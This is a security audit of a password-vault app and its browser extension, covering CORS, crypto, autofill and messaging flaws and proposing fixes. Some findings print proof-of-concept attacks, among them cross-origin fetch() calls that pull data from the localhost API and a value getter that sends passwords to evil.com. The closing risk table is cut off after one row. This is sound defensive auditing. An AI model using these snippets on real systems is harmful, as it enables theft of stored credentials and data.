# WRVault — Security Audit Report

**Date**: 2026-02-16
**Scope**: Complete codebase — vault storage, crypto, insert pipeline, overlay, commit logic, field matching, QuickInsert, save-credential, toggle system, IPC/messaging, domain scoping
**Posture**: Adversarial. Assumes skilled attacker with web page control, local process access, or extension compromise.
**Classification**: Internal — High Assurance Review

---

## SECTION A — Threat Model Definition

### A.1 In-Scope Threats

| # | Threat | Vector |
|---|--------|--------|
| T1 | Malicious website credential exfiltration | Page JS reads filled values, intercepts events, or exfiltrates via network |
| T2 | Hidden input fields | Invisible `<input>` receives injected password without user awareness |
| T3 | Invisible iframes | Cross-origin iframe captures credentials or clickjacks overlay |
| T4 | DOM mutation after preview | Page swaps field between overlay consent and commit |
| T5 | Clickjacking | Transparent overlay steals "Insert" click or covers consent UI |
| T6 | Malicious browser extensions | Other extension reads chrome.storage, intercepts messages |
| T7 | XSS on trusted domain | Attacker-controlled JS in renderer or extension page |
| T8 | CSP bypass | Extension CSP allows broad connect-src/img-src |
| T9 | Injected JS hooking value setters | `Object.defineProperty` on `HTMLInputElement.prototype.value` |
| T10 | Clipboard interception | System clipboard monitored by malware or clipboard manager |
| T11 | Accessibility API abuse | N/A — no native accessibility injection mode exists |
| T12 | Race condition exploitation | TOCTOU between safety checks and value injection |
| T13 | Side-channel attacks | Timing, mutation observation, layout measurement |
| T14 | Local process attacking 127.0.0.1 | Malware or rogue process calling HTTP/WS endpoints |
| T15 | Cross-site request to localhost | Website JS sends fetch() to 127.0.0.1 (CORS bypass) |

### A.2 Protection Boundaries

| Layer | WRVault Protects Against | WRVault Does NOT Protect Against |
|-------|-------------------------|----------------------------------|
| **Vault crypto** | Offline DB theft, brute-force (with strong passphrase) | Full memory dump of running process, compromised Electron main process |
| **VSBT** | Unauthorized local process calling vault API | Attacker with memory read access, compromised extension background |
| **Content script isolation** | Page JS accessing extension variables (MV3 isolated worlds) | Prototype pollution before content script loads (mitigated by MV3), shared DOM node references |
| **Shadow DOM (closed)** | Page reading overlay contents | `attachShadow` interception (pre-MV3), `composedPath()` event leakage, timing side-channels |
| **Consent overlay** | Silent auto-fill without user awareness | Synthetic keyboard events (if `isTrusted` not checked), page removing/covering overlay |
| **Fingerprinting** | Field swap between preview and commit | TOCTOU race during async safety checks, fingerprint collision (64-bit truncation) |

### A.3 Explicit Non-Protections

1. **Compromised Electron main process** — attacker IS the server; game over.
2. **Compromised extension background script** — holds VSBT, KEK path, full API access.
3. **OS-level keylogger / screen capture** — out of scope for a browser extension.
4. **Physical access to unlocked machine** — out of scope.
5. **127.0.0.1 network MITM** (loopback proxy injection) — VSBT travels over plaintext HTTP on localhost. Standard local-first threat model excludes this.

---

## SECTION B — Vault Storage & Cryptography Review

### B.1 Architecture Summary

```
Master Password → scrypt → KEK (256-bit)
                             ↓
                        wraps DEK (AES-256-GCM)
                             ↓
DEK → SQLCipher key (PBKDF2-HMAC-SHA512, 64k iter)
                             ↓
Per-record: random recordDEK → XChaCha20-Poly1305 → ciphertext
            recordDEK wrapped by KEK (AES-256-GCM)
            recordDEK zeroized after use
```

### B.2 Findings

#### B-CRIT-01: HTTP Server CORS `Access-Control-Allow-Origin: *` (CRITICAL)

**File**: `electron/main.ts:2611`
**Impact**: Any website can call the HTTP API on `127.0.0.1:51248`.

The HTTP API accepts requests from **any origin**. Combined with unauthenticated non-vault endpoints, this enables:

**Exploitation**: Victim visits `https://evil.com`. Attacker's JS executes:
```javascript
// Exfiltrate entire PostgreSQL key-value store — no auth needed
const data = await fetch('http://127.0.0.1:51248/api/db/get-all').then(r => r.json());
// Exfiltrate orchestrator data
const orch = await fetch('http://127.0.0.1:51248/api/orchestrator/get-all').then(r => r.json());
// Check vault status (exempt from VSBT)
const status = await fetch('http://127.0.0.1:51248/api/vault/status', {method:'POST'}).then(r => r.json());
```

If the vault is unlocked and the attacker can obtain the VSBT (via error message leakage or other vectors), full vault exfiltration is possible.

**Fix Required**: Restrict CORS to `chrome-extension://<extension-id>` only. Add authentication middleware to ALL HTTP endpoints, not just `/api/vault/*`.

#### B-CRIT-02: Non-Vault HTTP Endpoints Have Zero Authentication (CRITICAL)

**File**: `electron/main.ts:2702-3175`
**Impact**: `/api/db/*`, `/api/orchestrator/*`, `/api/dashboard/*`, `/api/auth/*` have no auth.

All PostgreSQL adapter endpoints, orchestrator data endpoints, and auth control endpoints accept unauthenticated requests. Combined with B-CRIT-01, any website can read/write the full application database.

**Fix Required**: Add VSBT or a separate shared-secret middleware to ALL routes. At minimum, bind a per-launch random secret as a required header.

#### B-CRIT-03: Preload Script Exposes All IPC Channels (CRITICAL)

**File**: `electron/preload.ts:4-24`
**Impact**: Any XSS in the renderer has full main-process access.

`contextBridge.exposeInMainWorld('ipcRenderer', ...)` exposes `send`, `invoke`, and `on` for **any IPC channel**. No allowlisting. An XSS can:
- `invoke('db:testConnection', {host:'attacker.com'})` — SSRF
- `invoke('get-desktop-sources', {types:['screen']})` — screen capture
- `send('mailguard-disable')` — disable security features
- Listen on any channel to intercept vault data

**Fix Required**: Replace with a strict channel allowlist. Only expose the minimum channels needed by the renderer.

#### B-HIGH-01: scrypt N=16384 — Below 2026 Recommendations (HIGH)

**File**: `electron/main/vault/crypto.ts:54-58, 79-81`
**Impact**: Weak KDF makes offline brute-force faster.

scrypt parameters: N=16384, r=8, p=1 → 16 MB memory. OWASP recommends N≥131072 (128 MB) for key derivation in 2026. The N parameter is **clamped to 16384** regardless of stored params — meaning even if a vault was created with stronger params, they are ignored on unlock.

**Fix Required**: Raise N to at least 65536 (64 MB). Work around the OpenSSL limit by using libsodium's `crypto_pwhash_scryptsalsa208sha256` or switch to Argon2id. Remove the hard clamp.

#### B-HIGH-02: Token Comparison Not Timing-Safe (HIGH)

**File**: `electron/main/vault/service.ts:1683`
**Impact**: VSBT could be brute-forced byte-by-byte via timing analysis.

`validateToken` uses `===` (strict equality) which short-circuits on first mismatch. An attacker measuring response times on the IPC/HTTP channel could extract the VSBT incrementally.

```typescript
// VULNERABLE
validateToken(token: string): boolean {
  return !!this.session && this.session.extensionToken === token
}
```

**Fix Required**:
```typescript
import { timingSafeEqual } from 'crypto'

validateToken(token: string): boolean {
  if (!this.session?.extensionToken) return false
  const a = Buffer.from(this.session.extensionToken, 'hex')
  const b = Buffer.from(token, 'hex')
  if (a.length !== b.length) return false
  return timingSafeEqual(a, b)
}
```

#### B-HIGH-03: DEK Hex String in Non-Zeroizable JS Variable (HIGH)

**File**: `electron/main/vault/db.ts:263-264, 316-317`
**Impact**: SQLCipher key persists in V8 heap until GC.

`const hexKey = dek.toString('hex')` creates an immutable JS string containing the DEK. Cannot be wiped from memory. The string persists in the V8 heap for an indeterminate time.

**Fix Required**: Pass the DEK as a Buffer directly to a native addon that sets the SQLCipher key, bypassing the JS string entirely. Short-term: minimize the hexKey's scope and set the local variable to `''` after use (does not guarantee erasure but removes the reference sooner).

#### B-HIGH-04: `--no-sandbox` Chromium Flag (HIGH)

**File**: `electron/main.ts:1553`
**Impact**: Eliminates renderer sandbox — critical defense-in-depth layer lost.

**Fix Required**: Remove `app.commandLine.appendSwitch('no-sandbox')` in production builds.

#### B-HIGH-05: Credential Dialog with `nodeIntegration: true` (HIGH)

**File**: `electron/main.ts:1157-1163`
**Impact**: Full Node.js access in a window loading user-influenced content.

**Fix Required**: Refactor credential dialog to use `contextIsolation: true` with a minimal preload, or use IPC to collect credentials from the main window.

#### B-MED-01: No AAD on Either Encryption Layer (MEDIUM)

**File**: `electron/main/vault/envelope.ts:65 (AES-GCM), 115 (XChaCha20)`
**Impact**: Wrapped DEK or ciphertext could theoretically be transplanted between records.

Neither the AES-256-GCM key wrapping nor the XChaCha20-Poly1305 record encryption binds the record ID, schema version, or record type as Associated Authenticated Data.

**Fix Required**: Pass `recordId` as AAD to both `wrapRecordDEK` and `encryptRecord`.

#### B-MED-02: Item Titles Logged to Console (MEDIUM)

**File**: `electron/main/vault/service.ts:581-585, 632`
**Impact**: Vault item titles (which may contain usernames, site names, or notes) appear in Electron console logs.

**Fix Required**: Remove title from log statements. Log only the item ID.

#### B-MED-03: Internal Error Messages Returned to Clients (MEDIUM)

**File**: `electron/main/vault/rpc.ts:173-179`, `electron/main.ts:3870`
**Impact**: Stack traces, file paths, crypto error details leak to the extension/renderer.

**Fix Required**: Return generic error messages. Log details server-side only.

#### B-MED-04: Verbose WebSocket Message Logging (MEDIUM)

**File**: `electron/main.ts:1790-1808`
**Impact**: Every WS message (including vault RPC params with master passwords) is logged verbatim.

**Fix Required**: Remove `console.log` of raw message content. Log only message type and ID.

#### B-MED-05: Plaintext Decrypt Cache 60s TTL (MEDIUM)

**File**: `electron/main/vault/cache.ts:39`
**Impact**: Decrypted passwords in JS strings for up to 60 seconds, non-zeroizable.

**Fix Required**: Reduce TTL to 5-10 seconds. Consider storing decrypted data in a native Buffer that can be zeroized, or eliminate the cache and decrypt on every access.

#### B-MED-06: Registry File Written Without Restrictive Permissions (MEDIUM)

**File**: `electron/main/vault/db.ts:226`
**Impact**: `vaults.json` written with default umask — world-readable on some systems.

**Fix Required**: Use `atomicWriteFileSync` (which sets mode 0o600) for the registry file.

#### B-LOW-01: autoLockMinutes=0 Disables Auto-Lock (LOW)

**File**: `electron/main/vault/service.ts:1461-1464`
**Impact**: Setting can prevent vault from ever locking.

**Fix Required**: Enforce a minimum (e.g., 1 minute) or require explicit acknowledgment for "never lock."

#### B-LOW-02: In-Memory Rate Limiting Resets on Restart (LOW)

**File**: `electron/main/vault/service.ts:188-194`
**Impact**: Attacker restarts process to reset failed-attempt counter.

**Fix Required**: Persist rate-limit state to disk or implement exponential backoff with persistent timestamps.

#### B-LOW-03: Legacy Field Key Not Zeroized (LOW)

**File**: `electron/main/vault/service.ts:1519-1526`
**Impact**: HKDF-derived field key stays in memory until GC.

**Fix Required**: Zeroize the `fieldKey` Buffer in a `finally` block.

---

## SECTION C — Insert Pipeline Audit

### C.1 Field Detection (`fieldScanner.ts`)

#### C-PIPE-01: No MutationObserver Guard Between Preview and Commit (CRITICAL)

The implementation plan specifies a `mutationGuard.ts` that watches for adversarial DOM changes (element removal, type/name/id changes, reparenting, hidden input siblings). **This file does not exist.** The `no_suspicious_mutation` and `is_user_intended` safety checks are defined in the type system but never executed in `runSafetyChecks()`.

**Exploitation**: Page detects overlay (via `document.getElementById('wrv-autofill-overlay')`) → waits for user to click "Insert" → swaps `<input name="password">` with `<input name="tracking-beacon" type="hidden">` → commit fills the hidden field → page exfiltrates via form action.

**Fix Required**: Implement `mutationGuard.ts`. Start a `MutationObserver` on `showOverlay()` targeting:
- Attribute changes on all `session.targets[].element` nodes (`name`, `id`, `type`, `autocomplete`, `form`, `action`)
- Child list changes on parent `<form>` elements
- Subtree additions of hidden inputs
If any mutation is detected, immediately invalidate the session.

#### C-PIPE-02: TOCTOU Race — Async Safety Checks Then Inject (CRITICAL)

**File**: `committer.ts:138-224`
**Impact**: Page script can swap field between Gate 3 (safety checks with `await`) and Gate 5 (injection).

Gate 3 runs `await runSafetyChecks()` (async due to SHA-256 fingerprint validation). Gate 4 runs `guardElement()` (synchronous). Gate 5 writes the value. Between Gate 3 completing and Gate 5 executing, the event loop yields, giving page scripts execution time.

**Fix Required**: Re-validate the fingerprint hash synchronously immediately before the value write. Use a synchronous hash (e.g., CRC-32 of the fingerprint properties as a fast guard, with SHA-256 as the authoritative check in Gate 3).

#### C-PIPE-03: `setAttribute('value', password)` Exposes Password in DOM (HIGH)

**File**: `committer.ts:420-438`
**Impact**: Password appears in DOM attributes, visible to any page script, analytics tool, or DOM serializer.

Strategy 3 (`trySetAttribute`) writes the password as an HTML attribute. Unlike the IDL `.value` property, attributes are:
- Readable via `element.getAttribute('value')`
- Serialized in `element.outerHTML`
- Captured by `MutationObserver` on attributes
- Visible to analytics scripts (Hotjar, FullStory, etc.)

**Fix Required**: Remove `setAttribute('value', ...)` entirely for sensitive fields. If strategies 1 and 2 fail for a password field, abort with an error rather than falling through to strategy 3.

```typescript
function setValueSafely(el, value, isSensitive) {
  let result = tryNativeSetter(el, value)
  if (result.success) return result
  result = tryDirectAssign(el, value)
  if (result.success) return result
  if (isSensitive) return { success: false, error: 'SENSITIVE_FIELD_SETTER_FAILED' }
  return trySetAttribute(el, value) // Only for non-sensitive fields
}
```

#### C-PIPE-04: Synthetic Enter Keypress Bypasses Consent (HIGH)

**File**: `overlayManager.ts:764-771`
**Impact**: Page script can trigger autofill without genuine user interaction.

The `onDocumentKeydown` handler does not check `e.isTrusted`. A page script can dispatch:
```javascript
document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
```
This triggers `onInsert()` — filling all fields without user consent.

**Fix Required**:
```typescript
function onDocumentKeydown(e: KeyboardEvent): void {
  if (!e.isTrusted) return  // Block synthetic events
  // ... rest of handler
}
```
Apply the same check to `onOutsideClick` for consistency.

#### C-PIPE-05: Prototype Getter Interception Leaks `commitValue` (HIGH)

**File**: `committer.ts:344-384`
**Impact**: Page script can intercept the password during verification read.

After writing the value via the native setter, `commitInsert` reads `element.value` to verify the write succeeded. A page script can define a per-instance getter:
```javascript
Object.defineProperty(passwordField, 'value', {
  get() { fetch('https://evil.com/?pw=' + this._realValue); return this._realValue; },
  set(v) { this._realValue = v; }
});
```

**Fix Required**: Skip the verification read for sensitive fields, or use the native prototype getter for verification (not the instance getter):
```typescript
const verifyDescriptor = Object.getOwnPropertyDescriptor(
  HTMLInputElement.prototype, 'value'
)
const actualValue = verifyDescriptor?.get?.call(element)
```

#### C-PIPE-06: DOM Fingerprint Truncated to 64 Bits (MEDIUM)

**File**: `domFingerprint.ts:207`
**Impact**: Increased collision probability for targeted attacks.

SHA-256 is truncated to 16 hex characters (64 bits). While a targeted preimage attack costs 2^64 (infeasible), an attacker who controls the DOM inputs can brute-force collisions faster by varying non-visible properties.

**Fix Required**: Increase to 32 hex characters (128 bits). Zero performance cost.

#### C-PIPE-07: `isTrusted=false` Events Leak Fill Timing (LOW)

**File**: `committer.ts:460-484`
**Impact**: Page scripts can detect autofill by checking `event.isTrusted` on input/change events.

By design. Not fixable without native browser integration. Documented as a known limitation.

### C.2 Hardened Commit Validation — Pseudocode

```
function hardenedCommitInsert(session):
  // Gate 0: Synthetic event guard
  assert session.consentEvent.isTrusted === true

  // Gate 1: Session state
  assert session.state === 'preview'
  session.state = 'committing'  // Prevent re-entry

  // Gate 2: Expiry
  assert Date.now() - session.createdAt < session.timeoutMs

  // Gate 3: Mutation guard
  assert mutationGuard.noSuspiciousMutations()

  for each target in session.targets:
    // Gate 4: Element guard (synchronous, immediately before write)
    assert guardElement(target.element).safe === true

    // Gate 5: Fingerprint re-validation (synchronous fast-check)
    currentProps = captureProperties(target.element)
    assert fastHash(currentProps) === target.fastHash

    // Gate 6: Sensitivity gate
    if target.field.sensitive:
      result = tryNativeSetter(target.element, target.commitValue)
      if not result.success:
        result = tryDirectAssign(target.element, target.commitValue)
      if not result.success:
        ABORT — do NOT fall through to setAttribute
    else:
      result = setValueSafely(target.element, target.commitValue)

    // Gate 7: Post-write verification (using PROTOTYPE getter, not instance)
    actualValue = HTMLInputElement.prototype.value.get.call(target.element)
    if actualValue !== target.commitValue:
      if not retried:
        retry once
      else:
        mark field as RACE_VALUE_OVERWRITTEN

    dispatchFillEvents(target.element)

  session.state = 'committed'
  zeroizeCommitValues(session)  // Overwrite commitValue strings
```

---

## SECTION D — Overlay Security

### D.1 Findings

#### D-OVER-01: Overlay Host Detectable by Page Scripts (MEDIUM)

**File**: `overlayManager.ts:234-237`
**Impact**: Page can detect, remove, reposition, or cover the overlay.

The overlay host `<div id="wrv-autofill-overlay">` is a child of `document.documentElement`. A page script can:
- `document.getElementById('wrv-autofill-overlay')` → detect overlay presence
- `element.remove()` → kill the overlay
- `element.style.opacity = '0'` → hide it while extension thinks it's visible
- Place a transparent div on top → intercept clicks

The position watchdog (checking >100px off-viewport) mitigates some vectors but not within-viewport repositioning or opacity attacks.

**Fix Required**:
1. Use a randomized `data-*` attribute instead of a predictable `id`.
2. Add opacity monitoring to the watchdog: check `getComputedStyle(_host).opacity` on each frame.
3. Add `pointer-events` monitoring: verify the host receives pointer events.

#### D-OVER-02: `composedPath()` Event Leakage (LOW)

When the user interacts with the overlay, `composedPath()` on the event reveals the full shadow DOM tree to any page-level event listener. This leaks internal structure (button labels, field count, etc.) but not field values (which are in textContent, not in the path).

**Mitigation**: Already partially mitigated by `stopPropagation()` on overlay events. Add `stopImmediatePropagation()` to prevent any page listeners registered at the capture phase.

### D.2 CSS Isolation Strategy

The overlay uses a closed Shadow DOM with an adopted `CSSStyleSheet` — correct approach. Page CSS cannot penetrate the shadow boundary. The overlay's CSS tokens use system fonts (no external loads) and inline SVG icons (no external resources).

**Status**: Sound. No CSS leakage vectors identified.

### D.3 Clickjacking Mitigation

`guardElement()` in `hardening.ts` performs an `elementFromPoint` check. The overlay watchdog checks for off-viewport repositioning. However:

**Gap**: No check for `_host`'s computed `opacity` or `visibility`. A page could set `opacity: 0.01` on the host, making it nearly invisible while still technically "in the viewport."

**Fix**: Add to watchdog:
```typescript
const hostStyle = getComputedStyle(_host)
if (parseFloat(hostStyle.opacity) < 0.5 || hostStyle.visibility === 'hidden') {
  onCancel() // Page is hiding our overlay
}
```

---

## SECTION E — Save Credential Logic

### E.1 Findings

#### E-SAVE-01: Domain Matching Without Public Suffix List (HIGH)

**File**: `credentialStore.ts:308-326`
**Impact**: Credentials stored for `github.io` match ANY `*.github.io` subdomain.

The `domainMatches` function uses bidirectional subdomain matching without PSL awareness. If a user stores a credential with domain `example.com`, it matches `evil.example.com`. Conversely, `admin.company.com` matches `company.com`.

**Fix Required**: Integrate the PSL check from `hardening.ts:isPublicSuffixDomain()`. Make subdomain matching unidirectional: parent matches children, but children should NOT match parents.

```typescript
function domainMatches(stored: string, current: string): boolean {
  // ... normalize ...
  if (normalized === target) return true
  // Parent → child: OK (example.com matches sub.example.com)
  if (target.endsWith('.' + normalized) && !isPublicSuffixDomain(normalized)) return true
  // Child → parent: BLOCKED (sub.example.com should NOT match example.com)
  return false
}
```

#### E-SAVE-02: Password in `innerHTML` Template (MEDIUM)

**File**: `saveBar.ts:263`
**Impact**: Password passes through the HTML parser.

The password is inserted via template literal into `innerHTML`. While `escapeAttr()` sanitizes it, the value transiently exists in the HTML parser's internal state and the resulting DOM attribute.

**Fix Required**: Build the password input via DOM API:
```typescript
const pwInput = document.createElement('input')
pwInput.type = 'password'
pwInput.value = creds.password  // Sets IDL property, not attribute
```

#### E-SAVE-03: Fetch/XHR Hooks Not Effective in MV3 Isolated World (MEDIUM)

**File**: `submitWatcher.ts:259-303`
**Impact**: Content script hooks `window.fetch` in its isolated world, but the page's main world uses the original, un-hooked `fetch`.

In Chrome MV3, content scripts run in an isolated JS world. Monkey-patching `window.fetch` in the content script does NOT affect the page's `window.fetch`. The submit watcher's network interception is ineffective for SPA auth flows.

**Fix Required**: Inject the fetch/XHR hook into the main world using `chrome.scripting.executeScript({ world: 'MAIN' })`, or use the `chrome.webRequest` API to observe network requests from the background script.

#### E-SAVE-04: Promise Leak on Rapid Form Submissions (MEDIUM)

**File**: `autofillOrchestrator.ts:329-391`
**Impact**: If `showSaveBar()` is called while another is pending, the first promise never resolves.

`hideSaveBar()` sets `_resolve = null` without resolving the pending promise. The first callback's `await showSaveBar()` hangs forever.

**Fix Required**: In `hideSaveBar()`, resolve the pending promise before nulling:
```typescript
export function hideSaveBar(): void {
  const pending = _resolve
  _resolve = null
  pending?.({ action: 'cancel' })
  // ... rest of cleanup
}
```

### E.2 False Positive Prevention

Current heuristics:
- Payment form detection ✓ (checks for card number, CVV, expiry fields)
- Empty password rejection ✓ (MIN_PASSWORD_LENGTH = 2)
- Search/filter field exclusion ✓ (checks input type and autocomplete)

**Gap**: MIN_PASSWORD_LENGTH = 2 is too low. Single-character passwords or stray keystrokes could trigger false positives.
**Fix**: Raise to 4. Add minimum interaction time check (user must have spent >500ms in the password field).

---

## SECTION F — QuickInsert & Search

### F.1 Findings

#### F-QI-01: Cross-Domain Credential Enumeration (MEDIUM-HIGH)

**File**: `quickSelect.ts:388-389`, `vaultIndex.ts:187-203`
**Impact**: QuickSelect shows entries from ALL domains, not just the current site.

When the user opens QuickSelect on `evil.com`, the dropdown displays titles and usernames from all vault entries (bank.com, email.com, etc.). While the shadow DOM is closed, timing and layout side-channels could leak information about vault contents.

**Fix Required**: Default to domain-scoped results. Show only entries matching the current domain. Add an explicit "Show all" toggle that requires an additional click and logs an audit event.

#### F-QI-02: Race Between `clearIndex()` and Async `buildIndex()` (MEDIUM)

**File**: `vaultIndex.ts:88-104, 151-154`
**Impact**: Vault lock calls `clearIndex()`, but an in-flight `buildIndex()` could overwrite the cleared state with stale data.

**Fix Required**: Add a generation counter:
```typescript
let _generation = 0
async function buildIndex() {
  const gen = ++_generation
  const items = await vaultAPI.listItems()
  if (_generation !== gen) return // Stale — someone called clearIndex
  _entries = items.map(itemToEntry)
}
function clearIndex() {
  _generation++
  _entries = []
}
```

#### F-QI-03: Audit Log Leaks Entry Titles (LOW)

**File**: `quickSelect.ts:502`
**Impact**: Vault entry titles logged in cleartext to local audit buffer.

**Fix Required**: Log item ID only, not title.

### F.2 Redaction Strategy

The vault index correctly excludes passwords. Usernames and titles are included (necessary for search). The index is cleared on vault lock (via `teardownAutofill` → `clearIndex`).

**Recommendation**: For the high-assurance profile, store only tokenized data (remove `username` and `title` from `IndexEntry`, keep only `tokens`). Reconstruct display strings by fetching individual items on demand.

---

## SECTION G — Toggle & Configuration Security

### G.1 Findings

#### G-TOG-01: No Schema Validation on Incoming Toggle Messages (MEDIUM)

**File**: `toggleSync.ts:201-206`
**Impact**: Malformed message could set `vaultUnlocked: true` on a locked vault.

The message listener accepts any object with `type === 'AUTOFILL_TOGGLES_CHANGED'` and a truthy `state`, then casts it to `AutofillToggleState` without validation.

**Fix Required**: Add runtime type checking:
```typescript
function isValidToggleState(s: unknown): s is AutofillToggleState {
  return typeof s === 'object' && s !== null &&
    typeof (s as any).enabled === 'boolean' &&
    typeof (s as any).vaultUnlocked === 'boolean' &&
    typeof (s as any).sections === 'object' &&
    typeof (s as any).syncedAt === 'number'
}
```

#### G-TOG-02: Default State is Fail-Open (LOW)

**File**: `toggleSync.ts:48-53`
**Impact**: If toggle sync fails, autofill defaults to enabled (mitigated by `vaultUnlocked: false`).

**Status**: Acceptable. The `vaultUnlocked: false` default prevents autofill from activating without a valid vault session. The fail-open default for `enabled` is a UX tradeoff.

### G.2 Enterprise Policy Lock

Not yet implemented. Required for Section J.

**Recommendation**: Add an `immutableFlags` field to `AutofillTierConfig`:
```typescript
immutableFlags?: {
  forceOverlay?: boolean      // Cannot be disabled by user
  blockAutoInsert?: boolean   // Cannot be enabled by user
  blockPublicSuffix?: boolean // Cannot be disabled by user
}
```
When `immutableFlags` is set, `updateSettings()` silently ignores attempts to change the locked values.

---

## SECTION H — Native / Accessibility Mode

**Status**: Not implemented. WRVault operates exclusively within the browser extension context. No native accessibility API injection, no OS-level autofill, no process injection.

**Recommendation**: If native mode is ever added:
1. Target application must be validated by executable path hash
2. Window handle must be verified against the active foreground window
3. Process isolation must be enforced (separate process for native injection)
4. OS-level input simulation (SendInput on Windows) requires elevation verification

---

## SECTION I — Cross Extension Attack Surface

### I.1 Findings

#### I-EXT-01: `ELECTRON_API_PROXY` Is an Unrestricted HTTP Proxy (CRITICAL)

**File**: `background.ts:1401-1439`
**Impact**: Any content script can call any Electron HTTP endpoint through the background script.

The background script proxies arbitrary HTTP requests to `127.0.0.1:51248` without validating the endpoint. Since content scripts run on `<all_urls>`, any webpage's content script context can send:
```javascript
chrome.runtime.sendMessage({
  type: 'ELECTRON_API_PROXY',
  endpoint: '/api/db/get-all',
  method: 'GET'
})
```

Combined with the unauthenticated non-vault endpoints, this is a full data exfiltration vector.

**Fix Required**: Add an endpoint allowlist to the proxy handler:
```typescript
const ALLOWED_PROXY_ENDPOINTS = new Set([
  '/api/vault/status',
  '/api/vault/health',
])
if (!ALLOWED_PROXY_ENDPOINTS.has(msg.endpoint)) {
  sendResponse({ success: false, error: 'Endpoint not allowed' })
  return
}
```

#### I-EXT-02: No Sender Validation on `chrome.runtime.onMessage` (HIGH)

**File**: `background.ts:1380`
**Impact**: Messages from content scripts running on malicious pages are treated identically to trusted UI messages.

**Fix Required**: Validate `sender.id === chrome.runtime.id` for all handlers. For vault-sensitive operations, additionally verify `sender.url` matches expected extension pages.

#### I-EXT-03: VSBT Stored in `chrome.storage.session` (MEDIUM)

**File**: `background.ts:30-40`
**Impact**: Any extension page or content script with `chrome.storage.session` access can read the VSBT.

**Mitigation**: In MV3, `chrome.storage.session` is accessible only from the extension's own contexts (not content scripts by default). However, if `chrome.storage.session.setAccessLevel('TRUSTED_AND_UNTRUSTED_CONTEXTS')` were ever called, content scripts would gain access.

**Fix Required**: Verify that `setAccessLevel` is never called. Add a comment documenting this security requirement.

#### I-EXT-04: Vault API Responses Written to `chrome.storage.local` (MEDIUM)

**File**: `background.ts:1822-1823`
**Impact**: Decrypted vault data persists on disk via chrome.storage.local.

Vault API responses (potentially containing decrypted items) are written to `chrome.storage.local` with timestamp keys. These are never cleaned up.

**Fix Required**: Remove this fallback storage mechanism entirely. If it's needed for debugging, gate it behind a debug flag that is off by default.

#### I-EXT-05: `window.vaultDebugLogs` Exposes API Calls (MEDIUM)

**File**: `api.ts:52-55`
**Impact**: Debug logs (endpoints, request bodies, responses) exposed on `window` object.

**Fix Required**: Remove in production. Use `chrome.storage.local` for debug logs if needed, gated behind a developer flag.

#### I-EXT-06: CSP Allows `connect-src https://*` (MEDIUM)

**File**: `manifest.config.ts:67`
**Impact**: Compromised extension page can exfiltrate data to any HTTPS server.

**Fix Required**: Restrict to specific known domains. Remove wildcard.

#### I-EXT-07: Web Accessible Resources on `<all_urls>` (LOW)

**File**: `manifest.config.ts:60-65`
**Impact**: Internal extension structure revealed to any webpage.

**Fix Required**: Restrict `matches` to specific patterns or remove unnecessary resources.

### I.2 Message Routing Hardening

Current state: `chrome.runtime.onMessage` is a single monolithic handler with no schema validation, no sender verification, and no message type allowlisting.

**Required architecture**:
```typescript
const MESSAGE_HANDLERS: Record<string, {
  handler: (msg: any, sender: chrome.runtime.MessageSender) => Promise<any>
  requireExtensionOrigin: boolean
  requireVSBT: boolean
  schema?: z.ZodSchema
}> = { ... }

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  const config = MESSAGE_HANDLERS[msg?.type]
  if (!config) return // Unknown message type — deny by default
  if (config.requireExtensionOrigin && sender.id !== chrome.runtime.id) return
  if (config.schema && !config.schema.safeParse(msg).success) return
  // ... dispatch
})
```

---

## SECTION J — Enterprise High Assurance Mode

### J.1 Configuration Schema

```typescript
export const HIGH_ASSURANCE_CONFIG: Readonly<AutofillTierConfig> = {
  band: 'enterprise',

  // Matching — strictest thresholds
  confidenceThreshold: 0.80,       // Very high bar
  maxScanElements: 60,             // Minimal scan surface
  scanThrottleMs: 500,
  formContextBoostEnabled: true,

  // Consent — always require explicit overlay consent
  sessionTimeoutMs: 30_000,        // 30 second sessions
  trustDomainToggleVisible: false,  // No domain trust — ever
  autoInsertAllowed: false,         // ALWAYS show overlay
  clipboardClearMs: 5_000,          // 5 second clipboard

  // Save Password — explicit only
  savePasswordEnabled: true,
  interceptNetworkRequests: false,  // No fetch/XHR hooking
  saveBarTimeoutMs: 15_000,         // Short save bar

  // QuickSelect — domain-scoped only
  quickSelectShortcutEnabled: true,
  quickSelectMaxResults: 5,
  triggerIconEnabled: true,

  // Hardening — maximum
  strictSafeMode: true,             // Never auto-insert
  blockPublicSuffix: true,          // Block shared hosting
  opacityCheckDepth: 6,             // Deep ancestor check
  coverCheckEnabled: true,
  spaWatcherEnabled: true,

  // Logging — full audit trail
  auditLogMaxEntries: 5000,
  telemetryMaxEntries: 2000,
  persistAuditLog: true,
  alwaysLogSecurity: true,
}
```

### J.2 Immutable Security Flags

```typescript
export const HIGH_ASSURANCE_LOCKS = {
  forceOverlay: true,           // Cannot be disabled by user settings
  blockAutoInsert: true,        // Cannot be enabled by user settings
  blockPublicSuffix: true,      // Cannot be disabled
  forcePerSessionConsent: true,  // "Always allow" toggle hidden
  requireExactOriginMatch: true, // No subdomain wildcards without explicit allowlist
  logAllInsertAttempts: true,    // Every commit attempt logged regardless of user prefs
  preventAutoSave: true,         // Save-password requires explicit disk icon click
} as const
```

### J.3 Activation Mechanism

1. Enterprise admin sets `tier: 'enterprise'` in the JWT claims from the auth server.
2. On vault unlock, `getConfigForTier('enterprise')` returns the base config.
3. `mergeConfig(baseConfig, HIGH_ASSURANCE_LOCKS)` applies immutable overrides.
4. The merged config is passed to `initAutofill()`.
5. `updateSettings()` in the vault service rejects attempts to override locked flags, returning a `POLICY_LOCKED` error.

### J.4 Code-Level Enforcement

```typescript
// In autofillOrchestrator.ts:
export function initAutofill(options: {
  tier: VaultTier
  overrides?: AutofillConfigOverrides
}): void {
  const baseConfig = getConfigForTier(options.tier)
  _config = mergeConfig(baseConfig, options.overrides ?? {})

  // Enforce immutable flags for enterprise
  if (_config.band === 'enterprise') {
    Object.freeze(_config)
    auditLog('security', 'HIGH_ASSURANCE_ACTIVE', 'Enterprise high assurance mode enabled')
  }

  // Never allow auto-insert if config says so
  if (!_config.autoInsertAllowed) {
    // Skip auto-insert path entirely — always show trigger icon or overlay
  }
}
```

---

## SECTION K — Risk Rating Summary Table

| # | Component | Risk | Exploit Scenario | Fix Required | Priority |
|---|-----------|------|------------------|--------------|----------|
| B-CRIT-01 | HTTP Server | **CRITICAL** | Any website exfiltrates DB via `fetch('http://127.0.0.1:51248/api/db/get-all')` | Restrict CORS, add auth to all endpoints | **P0** |
